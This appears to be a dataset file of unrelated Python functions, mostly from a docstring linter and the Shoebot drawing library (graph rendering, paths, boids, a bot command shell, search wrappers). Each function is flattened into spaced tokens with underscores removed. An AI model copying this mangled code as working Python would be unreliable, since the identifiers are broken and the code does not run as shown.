def parse from import names ( self , is future import ) : if self . current . value == "(" : self . consume ( tk . OP ) expected end kinds = ( tk . OP , ) else : expected end kinds = ( tk . NEWLINE , tk . ENDMARKER ) while self . current . kind not in expected end kinds and not ( self . current . kind == tk . OP and self . current . value == ";" ) : if self . current . kind != tk . NAME : self . stream . move ( ) continue self . log . debug ( "parsing import, token is %r (%s)" , self . current . kind , self . current . value , ) if is future import : self . log . debug ( "found future import: %s" , self . current . value ) self . future imports . add ( self . current . value ) self . consume ( tk . NAME ) self . log . debug ( "parsing import, token is %r (%s)" , self . current . kind , self . current . value , ) if self . current . kind == tk . NAME and self . current . value == "as" : self . consume ( tk . NAME ) # as if self . current . kind == tk . NAME : self . consume ( tk . NAME ) # new name, irrelevant if self . current . value == "," : self . consume ( tk . OP ) self . log . debug ( "parsing import, token is %r (%s)" , self . current . kind , self . current . value , )
def run ( self ) : # Is there any reason not to call load source here? if self . err is not None : assert self . source is None msg = "%s%03i %s" % ( rst prefix , rst fail load , "Failed to load file: %s" % self . err , ) yield 0 , 0 , msg , type ( self ) module = [ ] try : module = parse ( String IO ( self . source ) , self . filename ) except Syntax Error as err : msg = "%s%03i %s" % ( rst prefix , rst fail parse , "Failed to parse file: %s" % err , ) yield 0 , 0 , msg , type ( self ) module = [ ] except All Error : msg = "%s%03i %s" % ( rst prefix , rst fail all , "Failed to parse  all  entry." , ) yield 0 , 0 , msg , type ( self ) module = [ ] for definition in module : if not definition . docstring : # People can use flake8-docstrings to report missing # docstrings continue try : # Note we use the PEP257 trim algorithm to remove the # leading whitespace from each line - this avoids false # positive severe error "Unexpected section title." unindented = trim ( dequote docstring ( definition . docstring ) ) # Off load RST validation to re Structured Text-lint # which calls docutils internally. # TODO: Should we pass the Python filename as filepath? rst errors = list ( rst lint . lint ( unindented ) ) except Exception as err : # e.g. Unicode Decode Error msg = "%s%03i %s" % ( rst prefix , rst fail lint , "Failed to lint docstring: %s - %s" % ( definition . name , err ) , ) yield definition . start , 0 , msg , type ( self ) continue for rst error in rst errors : # TODO - make this a configuration option? if rst error . level <= 1 : continue # Levels: # # 0 - debug   --> we don't receive these # 1 - info    --> RST1## codes # 2 - warning --> RST2## codes # 3 - error   --> RST3## codes # 4 - severe  --> RST4## codes # # Map the string to a unique code: msg = rst error . message . split ( "\n" , 1 ) [ 0 ] code = code mapping ( rst error . level , msg ) assert code < 100 , code code += 100 * rst error . level msg = "%s%03i %s" % ( rst prefix , code , msg ) # This will return the line number by combining the # start of the docstring with the offet within it. # We don't know the column number, leaving as zero. yield definition . start + rst error . line , 0 , msg , type ( self )
def load source ( self ) : if self . filename in self . STDIN NAMES : self . filename = "stdin" if sys . version info [ 0 ] < 3 : self . source = sys . stdin . read ( ) else : self . source = Text IO Wrapper ( sys . stdin . buffer , errors = "ignore" ) . read ( ) else : # Could be a Python 2.7 String IO with no context manager, sigh. # with tokenize open(self.filename) as fd: #     self.source = fd.read() handle = tokenize open ( self . filename ) self . source = handle . read ( ) handle . close ( )
def listener ( self , sock , * args ) : conn , addr = sock . accept ( ) f = conn . makefile ( conn ) self . shell = Shoebot Cmd ( self . bot , stdin = f , stdout = f , intro = INTRO ) print ( ( "Connected" ) ) G Object . io add watch ( conn , G Object . IO IN , self . handler ) if self . shell . intro : self . shell . stdout . write ( str ( self . shell . intro ) + "\n" ) self . shell . stdout . flush ( ) return True
def handler ( self , conn , * args ) : # lines from cmd.Cmd self . shell . stdout . write ( self . shell . prompt ) line = self . shell . stdin . readline ( ) if not len ( line ) : line = 'EOF' return False else : line = line . rstrip ( '\r\n' ) line = self . shell . precmd ( line ) stop = self . shell . onecmd ( line ) stop = self . shell . postcmd ( stop , line ) self . shell . stdout . flush ( ) self . shell . postloop ( ) # end lines from cmd.Cmd if stop : self . shell = None conn . close ( ) return not stop
def do escape nl ( self , arg ) : if arg . lower ( ) == 'off' : self . escape nl = False else : self . escape nl = True
def do restart ( self , line ) : self . bot . frame = 0 self . bot . namespace . clear ( ) self . bot . namespace . update ( self . bot . initial namespace )
def do play ( self , line ) : if self . pause speed is None : self . bot . speed = self . pause speed self . pause speed = None self . print response ( "Play" )
def do vars ( self , line ) : if self . bot . vars : max name len = max ( [ len ( name ) for name in self . bot . vars ] ) for i , ( name , v ) in enumerate ( self . bot . vars . items ( ) ) : keep = i < len ( self . bot . vars ) - 1 self . print response ( "%s = %s" % ( name . ljust ( max name len ) , v . value ) , keep = keep ) else : self . print response ( "No vars" )
def do exit ( self , line ) : if self . trusted : publish event ( QUIT EVENT ) self . print response ( 'Bye.\n' ) return True
def do fullscreen ( self , line ) : self . bot . canvas . sink . trigger fullscreen action ( True ) print ( self . response prompt , file = self . stdout )
def do windowed ( self , line ) : self . bot . canvas . sink . trigger fullscreen action ( False ) print ( self . response prompt , file = self . stdout )
def do help ( self , arg ) : print ( self . response prompt , file = self . stdout ) return cmd . Cmd . do help ( self , arg )
def do set ( self , line ) : try : name , value = [ part . strip ( ) for part in line . split ( '=' ) ] if name not in self . bot . vars : self . print response ( 'No such variable %s enter vars to see available vars' % name ) return variable = self . bot . vars [ name ] variable . value = variable . sanitize ( value . strip ( ';' ) ) success , msg = self . bot . canvas . sink . var changed ( name , variable . value ) if success : print ( '{}={}' . format ( name , variable . value ) , file = self . stdout ) else : print ( '{}\n' . format ( msg ) , file = self . stdout ) except Exception as e : print ( 'Invalid Syntax.' , e ) return
def drawdaisy ( x , y , color = '#fefefe' ) : # save location, size etc ctx . push ( ) # save fill and stroke fill = ctx . fill ( ) stroke = ctx . stroke ( ) sc = ( 1.0 / ctx . HEIGHT ) * float ( y * 0.5 ) * 4.0 # draw stalk ctx . strokewidth ( sc * 2.0 ) ctx . stroke ( '#3B240B' ) ctx . line ( x + ( sin ( x * 0.1 ) * 10.0 ) , y + 80 , x + sin ( ctx . FRAME * 0.1 ) , y ) # draw flower ctx . translate ( - 20 , 0 ) ctx . scale ( sc ) # draw petals ctx . fill ( color ) ctx . nostroke ( ) for angle in xrange ( 0 , 360 , 45 ) : ctx . rotate ( degrees = 45 ) ctx . rect ( x , y , 40 , 8 , 1 ) # draw centre ctx . fill ( '#F7FE2E' ) ctx . ellipse ( x + 15 , y , 10 , 10 ) # restore fill and stroke ctx . fill ( fill ) ctx . stroke ( stroke ) # restore location, size etc ctx . pop ( )
def flatten fft ( scale = 1.0 ) : len = len ( audio . spectrogram ) for i , v in enumerate ( audio . spectrogram ) : yield scale * ( i * v ) / len
def scaled fft ( fft , scale = 1.0 ) : data = np . zeros ( len ( fft ) ) for i , v in enumerate ( fft ) : data [ i ] = scale * ( i * v ) / NUM SAMPLES return data
def create view ( self , name = "shoebot-output" ) : view = gtk . Text View ( ) view . set editable ( False ) fontdesc = pango . Font Description ( "Monospace" ) view . modify font ( fontdesc ) view . set name ( name ) buff = view . get buffer ( ) buff . create tag ( 'error' , foreground = 'red' ) return view
def load Grammar ( self , grammar , searchpaths = None ) : self . grammar = self . load ( grammar , searchpaths = searchpaths ) self . refs = { } for ref in self . grammar . get Elements By Tag Name ( "ref" ) : self . refs [ ref . attributes [ "id" ] . value ] = ref
def not found ( url , wait = 10 ) : try : connection = open ( url , wait ) except HTTP404Not Found : return True except : return False return False
def image ( self , path , x , y , width = None , height = None , alpha = 1.0 , data = None , draw = True , * * kwargs ) : return self . Image ( path , x , y , width , height , alpha , data , * * kwargs )
def star ( self , startx , starty , points = 20 , outer = 100 , inner = 50 , draw = True , * * kwargs ) : # Taken from Nodebox. self . beginpath ( * * kwargs ) self . moveto ( startx , starty + outer ) for i in range ( 1 , int ( 2 * points ) ) : angle = i * pi / points x = sin ( angle ) y = cos ( angle ) if i % 2 : radius = inner else : radius = outer x = startx + radius * x y = starty + radius * y self . lineto ( x , y ) return self . endpath ( draw )
def relmoveto ( self , x , y ) : if self . path is None : raise Shoebot Error ( ( "No current path. Use beginpath() first." ) ) self . path . relmoveto ( x , y )
def rellineto ( self , x , y ) : if self . path is None : raise Shoebot Error ( ( "No current path. Use beginpath() first." ) ) self . path . rellineto ( x , y )
def relcurveto ( self , h1x , h1y , h2x , h2y , x , y ) : if self . path is None : raise Shoebot Error ( ( "No current path. Use beginpath() first." ) ) self . path . relcurveto ( h1x , h1y , h2x , h2y , x , y )
def graph background ( s ) : if s . background == None : s . ctx . background ( None ) else : s . ctx . background ( s . background ) if s . depth : try : clr = colors . color ( s . background ) . darker ( 0.2 ) p = s . ctx . rect ( 0 , 0 , s . ctx . WIDTH , s . ctx . HEIGHT , draw = False ) colors . gradientfill ( p , clr , clr . lighter ( 0.35 ) ) colors . shadow ( dx = 0 , dy = 0 , blur = 2 , alpha = 0.935 , clr = s . background ) except : pass
def node ( s , node , alpha = 1.0 ) : if s . depth : try : colors . shadow ( dx = 5 , dy = 5 , blur = 10 , alpha = 0.5 * alpha ) except : pass s . ctx . nofill ( ) s . ctx . nostroke ( ) if s . fill : s . ctx . fill ( s . fill . r , s . fill . g , s . fill . b , s . fill . a * alpha ) if s . stroke : s . ctx . strokewidth ( s . strokewidth ) s . ctx . stroke ( s . stroke . r , s . stroke . g , s . stroke . b , s . stroke . a * alpha * 3 ) r = node . r s . ctx . oval ( node . x - r , node . y - r , r * 2 , r * 2 )
def node label ( s , node , alpha = 1.0 ) : if s . text : #s. ctx.lineheight(1)     s . ctx . font ( s . font ) s . ctx . fontsize ( s . fontsize ) s . ctx . nostroke ( ) s . ctx . fill ( s . text . r , s . text . g , s . text . b , s . text . a * alpha ) # Cache an outlined label text and translate it. # This enhances the speed and avoids wiggling text. try : p = node . textpath except : txt = node . label try : txt = unicode ( txt ) except : try : txt = txt . decode ( "utf-8" ) except : pass # Abbreviation. #root = node.graph.root #if txt != root and txt[-len(root):] == root:  #    txt = txt[:len(txt)-len(root)]+root[0]+"." dx , dy = 0 , 0 if s . align == 2 : #CENTER dx = - s . ctx . textwidth ( txt , s . textwidth ) / 2 dy = s . ctx . textheight ( txt ) / 2 node . textpath = s . ctx . textpath ( txt , dx , dy , width = s . textwidth ) p = node . textpath if s . depth : try : colors . shadow ( dx = 2 , dy = 4 , blur = 5 , alpha = 0.3 * alpha ) except : pass s . ctx . push ( ) s . ctx . translate ( node . x , node . y ) s . ctx . scale ( alpha ) s . ctx . drawpath ( p . copy ( ) ) s . ctx . pop ( )
def edges ( s , edges , alpha = 1.0 , weighted = False , directed = False ) : p = s . ctx . Bezier Path ( ) if directed and s . stroke : pd = s . ctx . Bezier Path ( ) if weighted and s . fill : pw = [ s . ctx . Bezier Path ( ) for i in range ( 11 ) ] # Draw the edges in a single Bezier Path for speed. # Weighted edges are divided into ten Bezier Paths, # depending on their weight rounded between 0 and 10. if len ( edges ) == 0 : return for e in edges : try : s2 = e . node1 . graph . styles [ e . node1 . style ] except : s2 = s if s2 . edge : s2 . edge ( s2 , p , e , alpha ) if directed and s . stroke : s2 . edge arrow ( s2 , pd , e , radius = 10 ) if weighted and s . fill : s2 . edge ( s2 , pw [ int ( e . weight * 10 ) ] , e , alpha ) s . ctx . autoclosepath ( False ) s . ctx . nofill ( ) s . ctx . nostroke ( ) # All weighted edges use the default fill. if weighted and s . fill : r = e . node1 . class ( None ) . r s . ctx . stroke ( s . fill . r , s . fill . g , s . fill . b , s . fill . a * 0.65 * alpha ) for w in range ( 1 , len ( pw ) ) : s . ctx . strokewidth ( r * w * 0.1 ) s . ctx . drawpath ( pw [ w ] . copy ( ) ) # All edges use the default stroke. if s . stroke : s . ctx . strokewidth ( s . strokewidth ) s . ctx . stroke ( s . stroke . r , s . stroke . g , s . stroke . b , s . stroke . a * 0.65 * alpha ) s . ctx . drawpath ( p . copy ( ) ) if directed and s . stroke : #clr = s. ctx.stroke().copy() clr = s . ctx . color ( s . stroke . r , s . stroke . g , s . stroke . b , s . stroke . a * 0.65 * alpha ) clr . a *= 1.3 s . ctx . stroke ( clr ) s . ctx . drawpath ( pd . copy ( ) ) for e in edges : try : s2 = self . styles [ e . node1 . style ] except : s2 = s if s2 . edge label : s2 . edge label ( s2 , e , alpha )
def edge ( s , path , edge , alpha = 1.0 ) : path . moveto ( edge . node1 . x , edge . node1 . y ) if edge . node2 . style == BACK : path . curveto ( edge . node1 . x , edge . node2 . y , edge . node2 . x , edge . node2 . y , edge . node2 . x , edge . node2 . y , ) else : path . lineto ( edge . node2 . x , edge . node2 . y )
def edge label ( s , edge , alpha = 1.0 ) : if s . text and edge . label != "" : s . ctx . nostroke ( ) s . ctx . fill ( s . text . r , s . text . g , s . text . b , s . text . a * alpha * 0.75 ) s . ctx . lineheight ( 1 ) s . ctx . font ( s . font ) s . ctx . fontsize ( s . fontsize * 0.75 ) # Cache an outlined label text and translate it. # This enhances the speed and avoids wiggling text. try : p = edge . textpath except : try : txt = unicode ( edge . label ) except : try : txt = edge . label . decode ( "utf-8" ) except : pass edge . textpath = s . ctx . textpath ( txt , s . ctx . textwidth ( " " ) , 0 , width = s . textwidth ) p = edge . textpath # Position the label centrally along the edge line. a = degrees ( atan2 ( edge . node2 . y - edge . node1 . y , edge . node2 . x - edge . node1 . x ) ) d = sqrt ( ( edge . node2 . x - edge . node1 . x ) ** 2 + ( edge . node2 . y - edge . node1 . y ) ** 2 ) d = abs ( d - s . ctx . textwidth ( edge . label ) ) * 0.5 s . ctx . push ( ) s . ctx . transform ( CORNER ) s . ctx . translate ( edge . node1 . x , edge . node1 . y ) s . ctx . rotate ( - a ) s . ctx . translate ( d , s . fontsize * 1.0 ) s . ctx . scale ( alpha ) # Flip labels on the left hand side so they are legible. if 90 < a % 360 < 270 : s . ctx . translate ( s . ctx . textwidth ( edge . label ) , - s . fontsize * 2.0 ) s . ctx . transform ( CENTER ) s . ctx . rotate ( 180 ) s . ctx . transform ( CORNER ) s . ctx . drawpath ( p . copy ( ) ) s . ctx . pop ( )
def path ( s , graph , path ) : def end ( n ) : r = n . r * 0.35 s . ctx . oval ( n . x - r , n . y - r , r * 2 , r * 2 ) if path and len ( path ) > 1 and s . stroke : s . ctx . nofill ( ) s . ctx . stroke ( s . stroke . r , s . stroke . g , s . stroke . b , s . stroke . a ) if s . name != DEFAULT : s . ctx . strokewidth ( s . strokewidth ) else : s . ctx . strokewidth ( s . strokewidth * 2 ) first = True for id in path : n = graph [ id ] if first : first = False s . ctx . beginpath ( n . x , n . y ) end ( n ) else : s . ctx . lineto ( n . x , n . y ) s . ctx . endpath ( ) end ( n )
def copy ( self , graph ) : s = styles ( graph ) s . guide = self . guide . copy ( graph ) dict . init ( s , [ ( v . name , v . copy ( ) ) for v in self . values ( ) ] ) return s
def apply ( self ) : sorted = self . order + self . keys ( ) unique = [ ] [ unique . append ( x ) for x in sorted if x not in unique ] for node in self . graph . nodes : for s in unique : if self . has key ( s ) and self [ s ] ( self . graph , node ) : node . style = s
def copy ( self , graph ) : g = styleguide ( graph ) g . order = self . order dict . init ( g , [ ( k , v ) for k , v in self . iteritems ( ) ] ) return g
def callback ( self , * incoming ) : message = incoming [ 0 ] if message : address , command = message [ 0 ] , message [ 2 ] profile = self . get profile ( address ) if profile is not None : try : getattr ( profile , command ) ( self , message ) except Attribute Error : pass
def copytree ( src , dst , symlinks = False , ignore = None ) : # http://stackoverflow.com/questions/1868714/how-do-i-copy-an-entire-directory-of-files-into-an-existing-directory-using-pyth if not os . path . exists ( dst ) : os . makedirs ( dst ) shutil . copystat ( src , dst ) lst = os . listdir ( src ) if ignore : excl = ignore ( src , lst ) lst = [ x for x in lst if x not in excl ] for item in lst : s = os . path . join ( src , item ) d = os . path . join ( dst , item ) if symlinks and os . path . islink ( s ) : if os . path . lexists ( d ) : os . remove ( d ) os . symlink ( os . readlink ( s ) , d ) try : st = os . lstat ( s ) mode = stat . S IMODE ( st . st mode ) os . lchmod ( d , mode ) except : pass # lchmod not available elif os . path . isdir ( s ) : copytree ( s , d , symlinks , ignore ) else : shutil . copy2 ( s , d )
def search ( q , start = 0 , wait = 10 , asynchronous = False , cached = False ) : service = GOOGLE SEARCH return Google Search ( q , start , service , "" , wait , asynchronous , cached )
def search images ( q , start = 0 , size = "" , wait = 10 , asynchronous = False , cached = False ) : service = GOOGLE IMAGES return Google Search ( q , start , service , size , wait , asynchronous , cached )
def search news ( q , start = 0 , wait = 10 , asynchronous = False , cached = False ) : service = GOOGLE NEWS return Google Search ( q , start , service , "" , wait , asynchronous , cached )
def search blogs ( q , start = 0 , wait = 10 , asynchronous = False , cached = False ) : service = GOOGLE BLOGS return Google Search ( q , start , service , "" , wait , asynchronous , cached )
def parse ( self , str ) : str = replace entities ( str ) str = strip tags ( str ) str = collapse spaces ( str ) return str
def hash ( self , id ) : h = md5 ( id ) . hexdigest ( ) return os . path . join ( self . path , h + self . type )
def age ( self , id ) : path = self . hash ( id ) if os . path . exists ( path ) : modified = datetime . datetime . fromtimestamp ( os . stat ( path ) [ 8 ] ) age = datetime . datetime . today ( ) - modified return age . days else : return 0
def angle ( x0 , y0 , x1 , y1 ) : return degrees ( atan2 ( y1 - y0 , x1 - x0 ) )
def distance ( x0 , y0 , x1 , y1 ) : return sqrt ( pow ( x1 - x0 , 2 ) + pow ( y1 - y0 , 2 ) )
def invert ( self ) : m = self . matrix d = m [ 0 ] * m [ 4 ] - m [ 1 ] * m [ 3 ] self . matrix = [ m [ 4 ] / d , - m [ 1 ] / d , 0 , - m [ 3 ] / d , m [ 0 ] / d , 0 , ( m [ 3 ] * m [ 7 ] - m [ 4 ] * m [ 6 ] ) / d , - ( m [ 0 ] * m [ 7 ] - m [ 1 ] * m [ 6 ] ) / d , 1 ]
def transform path ( self , path ) : p = path . class ( ) for pt in path : if pt . cmd == "close" : p . closepath ( ) elif pt . cmd == "moveto" : p . moveto ( * self . apply ( pt . x , pt . y ) ) elif pt . cmd == "lineto" : p . lineto ( * self . apply ( pt . x , pt . y ) ) elif pt . cmd == "curveto" : vx1 , vy1 = self . apply ( pt . ctrl1 . x , pt . ctrl1 . y ) vx2 , vy2 = self . apply ( pt . ctrl2 . x , pt . ctrl2 . y ) x , y = self . apply ( pt . x , pt . y ) p . curveto ( vx1 , vy1 , vx2 , vy2 , x , y ) return p
def intersects ( self , b ) : return max ( self . x , b . x ) < min ( self . x + self . width , b . x + b . width ) and max ( self . y , b . y ) < min ( self . y + self . height , b . y + b . height )
def union ( self , b ) : mx , my = min ( self . x , b . x ) , min ( self . y , b . y ) return Bounds ( mx , my , max ( self . x + self . width , b . x + b . width ) - mx , max ( self . y + self . height , b . y + b . height ) - my )
def contains ( self , * a ) : if len ( a ) == 2 : a = [ Point ( a [ 0 ] , a [ 1 ] ) ] if len ( a ) == 1 : a = a [ 0 ] if isinstance ( a , Point ) : return a . x >= self . x and a . x <= self . x + self . width and a . y >= self . y and a . y <= self . y + self . height if isinstance ( a , Bounds ) : return a . x >= self . x and a . x + a . width <= self . x + self . width and a . y >= self . y and a . y + a . height <= self . y + self . height
def error ( message ) : global parser print ( ( "Error: " ) + message ) print ( ) parser . print help ( ) sys . exit ( )
def fill ( self , * args ) : self . fillcolor = self . color ( * args ) return self . fillcolor
def stroke ( self , * args ) : self . strokecolor = self . color ( * args ) return self . strokecolor
def textpath ( self , txt , x , y , width = None , height = 1000000 , enable Rendering = False , * * kwargs ) : txt = self . Text ( txt , x , y , width , height , * * kwargs ) path = txt . path if draw : path . draw ( ) return path
def draw cornu flat ( x0 , y0 , t0 , t1 , s0 , c0 , flip , cs , ss , cmd ) : for j in range ( 0 , 100 ) : t = j * .01 s , c = eval cornu ( t0 + t * ( t1 - t0 ) ) s *= flip s -= s0 c -= c0 #print '%', c, s x = c * cs - s * ss y = s * cs + c * ss print pt ( x0 + x , y0 + y , cmd ) cmd = 'lineto' return cmd
def draw cornu bezier ( x0 , y0 , t0 , t1 , s0 , c0 , flip , cs , ss , cmd , scale , rot ) : s = None for j in range ( 0 , 5 ) : # travel along the function two points at a time (at time t and t2) # the first time through we'll need to get both points # after that we only need the second point because the old second point # becomes the new first point t = j * .2 t2 = t + .2 curvetime = t0 + t * ( t1 - t0 ) curvetime2 = t0 + t2 * ( t1 - t0 ) Dt = ( curvetime2 - curvetime ) * scale if not s : # get first point # avoid calling this again: the next time though x,y will equal x3, y3 s , c = eval cornu ( curvetime ) s *= flip s -= s0 c -= c0 # calculate derivative of fresnel function at point to get tangent slope # just take the integrand of the fresnel function dx1 = cos ( pow ( curvetime , 2 ) + ( flip * rot ) ) dy1 = flip * sin ( pow ( curvetime , 2 ) + ( flip * rot ) ) # x,y = first point on function x = ( ( c * cs - s * ss ) + x0 ) y = ( ( s * cs + c * ss ) + y0 ) #evaluate the fresnel further along the function to look ahead to the next point s2 , c2 = eval cornu ( curvetime2 ) s2 *= flip s2 -= s0 c2 -= c0 dx2 = cos ( pow ( curvetime2 , 2 ) + ( flip * rot ) ) dy2 = flip * sin ( pow ( curvetime2 , 2 ) + ( flip * rot ) ) # x3, y3 = second point on function x3 = ( ( c2 * cs - s2 * ss ) + x0 ) y3 = ( ( s2 * cs + c2 * ss ) + y0 ) # calculate control points x1 = ( x + ( ( Dt / 3.0 ) * dx1 ) ) y1 = ( y + ( ( Dt / 3.0 ) * dy1 ) ) x2 = ( x3 - ( ( Dt / 3.0 ) * dx2 ) ) y2 = ( y3 - ( ( Dt / 3.0 ) * dy2 ) ) if cmd == 'moveto' : print pt ( x , y , cmd ) cmd = 'curveto' print crv ( x1 , y1 , x2 , y2 , x3 , y3 ) dx1 , dy1 = dx2 , dy2 x , y = x3 , y3 return cmd
def search ( q , start = 1 , count = 10 , context = None , wait = 10 , asynchronous = False , cached = False ) : service = YAHOO SEARCH return Yahoo Search ( q , start , count , service , context , wait , asynchronous , cached )
def search images ( q , start = 1 , count = 10 , wait = 10 , asynchronous = False , cached = False ) : service = YAHOO IMAGES return Yahoo Search ( q , start , count , service , None , wait , asynchronous , cached )
def search news ( q , start = 1 , count = 10 , wait = 10 , asynchronous = False , cached = False ) : service = YAHOO NEWS return Yahoo Search ( q , start , count , service , None , wait , asynchronous , cached )
def suggest spelling ( q , wait = 10 , asynchronous = False , cached = False ) : return Yahoo Spelling ( q , wait , asynchronous , cached )
def parse ( self , e , tag ) : tags = e . get Elements By Tag Name ( tag ) children = tags [ 0 ] . child Nodes if len ( children ) != 1 : return None assert children [ 0 ] . node Type == xml . dom . minidom . Element . TEXT NODE s = children [ 0 ] . node Value s = format data ( s ) s = replace entities ( s ) return s
def delete ( self ) : i = self . index ( ) if i != None : del self . canvas . layers [ i ]
def up ( self ) : i = self . index ( ) if i != None : del self . canvas . layers [ i ] i = min ( len ( self . canvas . layers ) , i + 1 ) self . canvas . layers . insert ( i , self )
def down ( self ) : i = self . index ( ) if i != None : del self . canvas . layers [ i ] i = max ( 0 , i - 1 ) self . canvas . layers . insert ( i , self )
def invert ( self ) : alpha = self . img . split ( ) [ 3 ] self . img = self . img . convert ( "RGB" ) self . img = Image Ops . invert ( self . img ) self . img = self . img . convert ( "RGBA" ) self . img . putalpha ( alpha )
def flip ( self , axis = HORIZONTAL ) : if axis == HORIZONTAL : self . img = self . img . transpose ( Image . FLIP LEFT RIGHT ) if axis == VERTICAL : self . img = self . img . transpose ( Image . FLIP TOP BOTTOM )
def should run ( self , iteration , max iterations ) : if iteration == 0 : # First frame always runs return True if max iterations : if iteration < max iterations : return True elif max iterations is None : if self . dynamic : return True else : return False return True if not self . dynamic : return False return False
def hex to rgb ( hex ) : hex = hex . lstrip ( "#" ) if len ( hex ) < 6 : hex += hex [ - 1 ] * ( 6 - len ( hex ) ) if len ( hex ) == 6 : r , g , b = hex [ 0 : 2 ] , hex [ 2 : 4 ] , hex [ 4 : ] r , g , b = [ int ( n , 16 ) / 255.0 for n in ( r , g , b ) ] a = 1.0 elif len ( hex ) == 8 : r , g , b , a = hex [ 0 : 2 ] , hex [ 2 : 4 ] , hex [ 4 : 6 ] , hex [ 6 : ] r , g , b , a = [ int ( n , 16 ) / 255.0 for n in ( r , g , b , a ) ] return r , g , b , a
def simple traceback ( ex , source ) : exc type , exc value , exc tb = sys . exc info ( ) exc = traceback . format exception ( exc type , exc value , exc tb ) source arr = source . splitlines ( ) # Defaults... exc location = exc [ - 2 ] for i , err in enumerate ( exc ) : if 'exec source in ns' in err : exc location = exc [ i + 1 ] break # extract line number from traceback fn = exc location . split ( ',' ) [ 0 ] [ 8 : - 1 ] line number = int ( exc location . split ( ',' ) [ 1 ] . replace ( 'line' , '' ) . strip ( ) ) # Build error messages err msgs = [ ] # code around the error err where = ' ' . join ( exc [ i - 1 ] . split ( ',' ) [ 1 : ] ) . strip ( ) # 'line 37 in blah" err msgs . append ( 'Error in the Shoebot script at %s:' % err where ) for i in xrange ( max ( 0 , line number - 5 ) , line number ) : if fn == "<string>" : line = source arr [ i ] else : line = linecache . getline ( fn , i + 1 ) err msgs . append ( '%s: %s' % ( i + 1 , line . rstrip ( ) ) ) err msgs . append ( '  %s^ %s' % ( len ( str ( i ) ) * ' ' , exc [ - 1 ] . rstrip ( ) ) ) err msgs . append ( '' ) # traceback err msgs . append ( exc [ 0 ] . rstrip ( ) ) for err in exc [ 3 : ] : err msgs . append ( err . rstrip ( ) ) return '\n' . join ( err msgs )
def close ( self ) : self . con . commit ( ) self . cur . close ( ) self . con . close ( )
def sql ( self , sql ) : self . cur . execute ( sql ) if sql . lower ( ) . find ( "select" ) >= 0 : matches = [ ] for r in self . cur : matches . append ( r ) return matches
def edit ( self , id , * args , * * kw ) : if args and kw : return if args and type ( args [ 0 ] ) == dict : fields = [ k for k in args [ 0 ] ] v = [ args [ 0 ] [ k ] for k in args [ 0 ] ] if kw : fields = [ k for k in kw ] v = [ kw [ k ] for k in kw ] sql = "update " + self . name + " set " + "=?, " . join ( fields ) + "=? where " + self . key + "=" + unicode ( id ) self . db . cur . execute ( sql , v ) self . db . i += 1 if self . db . i >= self . db . commit : self . db . i = 0 self . db . con . commit ( )
def remove ( self , id , operator = "=" , key = None ) : if key == None : key = self . key try : id = unicode ( id ) except : pass sql = "delete from " + self . name + " where " + key + " " + operator + " ?" self . db . cur . execute ( sql , ( id , ) )
def reload functions ( self ) : with Live Execution . lock : if self . edited source : tree = ast . parse ( self . edited source ) for f in [ n for n in ast . walk ( tree ) if isinstance ( n , ast . Function Def ) ] : self . ns [ f . name ] . code = meta . decompiler . compile func ( f , self . filename , self . ns ) . code
def run ( self ) : with Live Execution . lock : if self . edited source : success , ex = self . run tenuous ( ) if success : return self . do exec ( self . known good , self . ns )
def alignment ( self , d = 5 ) : vx = vy = vz = 0 for b in self . boids : if b != self : vx , vy , vz = vx + b . vx , vy + b . vy , vz + b . vz n = len ( self . boids ) - 1 vx , vy , vz = vx / n , vy / n , vz / n return ( vx - self . vx ) / d , ( vy - self . vy ) / d , ( vz - self . vz ) / d
def angle ( self ) : from math import atan , pi , degrees a = degrees ( atan ( self . vy / self . vx ) ) + 360 if self . vx < 0 : a += 180 return a
def goal ( self , x , y , z , d = 50.0 ) : return ( x - self . x ) / d , ( y - self . y ) / d , ( z - self . z ) / d
def update ( self , shuffled = True , cohesion = 100 , separation = 10 , alignment = 5 , goal = 20 , limit = 30 ) : # Shuffling the list of boids ensures fluid movement. # If you need the boids to retain their position in the list # each update, set the shuffled parameter to False. from random import shuffle if shuffled : shuffle ( self ) m1 = 1.0 # cohesion m2 = 1.0 # separation m3 = 1.0 # alignment m4 = 1.0 # goal # The flock scatters randomly with a Boids.scatter chance. # This means their cohesion (m1) is reversed, # and their joint alignment (m3) is dimished, # causing boids to oscillate in confusion. # Setting Boids.scatter(chance=0) ensures they never scatter. if not self . scattered and ctx . random ( ) < self . scatter : self . scattered = True if self . scattered : m1 = - m1 m3 *= 0.25 self . scatter i += 1 if self . scatter i >= self . scatter t : self . scattered = False self . scatter i = 0 # A flock can have a goal defined with Boids.goal(x,y,z), # a place of interest to flock around. if not self . has goal : m4 = 0 if self . flee : m4 = - m4 for b in self : # A boid that is perching will continue to do so # until Boid. perch t reaches zero. if b . is perching : if b . perch t > 0 : b . perch t -= 1 continue else : b . is perching = False vx1 , vy1 , vz1 = b . cohesion ( cohesion ) vx2 , vy2 , vz2 = b . separation ( separation ) vx3 , vy3 , vz3 = b . alignment ( alignment ) vx4 , vy4 , vz4 = b . goal ( self . gx , self . gy , self . gz , goal ) b . vx += m1 * vx1 + m2 * vx2 + m3 * vx3 + m4 * vx4 b . vy += m1 * vy1 + m2 * vy2 + m3 * vy3 + m4 * vy4 b . vz += m1 * vz1 + m2 * vz2 + m3 * vz3 + m4 * vz4 b . limit ( limit ) b . x += b . vx b . y += b . vy b . z += b . vz self . constrain ( )
def iterscan ( self , string , idx = 0 , context = None ) : match = self . scanner . scanner ( string , idx ) . match actions = self . actions lastend = idx end = len ( string ) while True : m = match ( ) if m is None : break matchbegin , matchend = m . span ( ) if lastend == matchend : break action = actions [ m . lastindex ] if action is not None : rval , next pos = action ( m , context ) if next pos is not None and next pos != matchend : # "fast forward" the scanner matchend = next pos match = self . scanner . scanner ( string , matchend ) . match yield rval , matchend lastend = matchend
def copy ( self , graph ) : l = self . class ( graph , self . n ) l . i = 0 return l
